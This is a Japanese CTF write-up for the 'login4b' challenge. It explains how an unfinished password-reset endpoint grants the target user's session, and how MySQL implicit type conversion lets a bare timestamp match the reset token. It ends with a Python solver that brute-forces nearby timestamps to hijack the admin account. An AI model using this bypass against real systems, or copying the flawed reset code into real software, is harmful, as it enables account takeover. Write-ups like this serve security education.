# login4b

420 Points / 102 Solves

<!-- @import "[TOC]" {cmd="toc" depthFrom=2 depthTo=3 orderedList=false} -->

<!-- code_chunk_output -->

- [調査](#調査)
  - [MySQL暗黙的型変換](#mysql暗黙的型変換)
- [Solver](#solver)

<!-- /code_chunk_output -->

## 調査

- URLにアクセスすると以下の機能を確認できる
  - ログイン（Login）
  - ログアウト（Logout）
  - 新規登録（Register）
  - パスワードリセット（Password Reset）
  - リセットトークン生成（Request Reset Token）
  - フラグ生成（Get Flag）

- FLAGは`admin`としてログインしている状態でフラグ生成することで取得できる

- ソースコード内コメントからパスワードリセット機能が未完成であることがわかる

```ts
app.post("/api/reset-password", async (req: Request, res: Response) => {
  try {
    const { username, token, newPassword } = req.body;
    if (!username || !token || !newPassword) {
      return res
        .status(400)
        .json({ error: "Username, token, and new password are required" });
    }

    const isValid = await db.validateResetTokenByUsername(username, token);

    if (!isValid) {
      return res.status(400).json({ error: "Invalid token" });
    }

    // TODO: implement
    // await db.updatePasswordByUsername(username, newPassword);

    // TODO: remove this
    const user = await db.findUser(username);
    if (!user) {
      return res.status(401).json({ error: "Invalid username" });
    }
    req.session.userId = user.userid;
    req.session.username = user.username;

    res.json({
      success: true,
      message: `The function to update the password is not implemented, so I will set you the ${user.username}'s session`,
    });
  } catch (error) {
    console.error("Password reset error:", error);
    res.status(500).json({ error: "Reset failed" });
  }
});
```

- 実装途中のためパスワードリセットする代わりに、該当ユーザとして有効なセッションが発行されている

```ts
const user = await db.findUser(username);
if (!user) {
  return res.status(401).json({ error: "Invalid username" });
}
req.session.userId = user.userid;
req.session.username = user.username;
```

- パスワードリセット機能を使うためにはリセット用のトークンを生成する必要がある

```ts
async validateResetTokenByUsername(
  username: string,
  token: string
): Promise<boolean> {
  await this.initialized;
  console.log("token: " + token);
  const [rows] = (await this.pool.execute(
    "SELECT COUNT(*) as count FROM users WHERE username = ? AND reset_token = ?",
    [username, token]
  )) as [any[], mysql.FieldPacket[]];
  return rows[0].count > 0;
}
```

- 逆に言うと、リセット用のトークンがわかれば他のユーザとしてなりすませる

- トークン生成にはUUIDv4が使われており、推測はできないはず

````ts
async generateResetToken(userid: number): Promise<string> {
  await this.initialized;
  const timestamp = Math.floor(Date.now() / 1000);
  const token = `${timestamp}_${uuidv4()}`;

  await this.pool.execute(
    "UPDATE users SET reset_token = ? WHERE userid = ?",
    [token, userid]
  );
  return token;
}
````

- トークンの形式は`<タイムスタンプ(秒)>_<UUIDv4>`

### MySQL暗黙的型変換

- データベースとしてMySQLが使われており、型が違う値を比較する際に（例:文字列と数値）の比較をする際に暗黙の型変換が行われる

```sql
mysql> select '1753508906_13b2ff97-22ff-4c53-ac28-a6d58b9787c0' + 0;
+-------------------------------------------------------+
| '1753508906_13b2ff97-22ff-4c53-ac28-a6d58b9787c0' + 0 |
+-------------------------------------------------------+
|                                            1753508906 |
+-------------------------------------------------------+
1 row in set, 1 warning (0.00 sec)
```

```sql
mysql> select '1753508906_13b2ff97-22ff-4c53-ac28-a6d58b9787c0' = 1753508906;
+----------------------------------------------------------------+
| '1753508906_13b2ff97-22ff-4c53-ac28-a6d58b9787c0' = 1753508906 |
+----------------------------------------------------------------+
|                                                              1 |
+----------------------------------------------------------------+
1 row in set, 1 warning (0.00 sec)
```

- この挙動を利用することで、UUIDv4の値がわからなくてもタイムスタンプ（現在時刻秒）だけでパスワードリセット機能が使える

## Solver

```py
import requests
import json
import time

url = 'http://login4b.challenges.beginners.seccon.jp'

session = requests.Session()
data = {'username': 'admin'}
res = session.post(
    f'{url}/api/reset-request',
    data=json.dumps(data),
    headers={"Content-Type": "application/json"}
)
# print(res.text)

timestamp = int(time.time())
for i in range(-5, 6, 1): # サーバとの時差を考慮して±5秒
    # print(timestamp+i)
    data = {'username': 'admin', 'token': timestamp+i, 'newPassword': 'something'}
    res = session.post(
        f'{url}/api/reset-password',
        data=json.dumps(data),
        headers={"Content-Type": "application/json"}
    )
    if 'success' in res.json():
        break

res = session.get(f'{url}/api/get_flag')
data = res.json()
print(data['flag'])
```
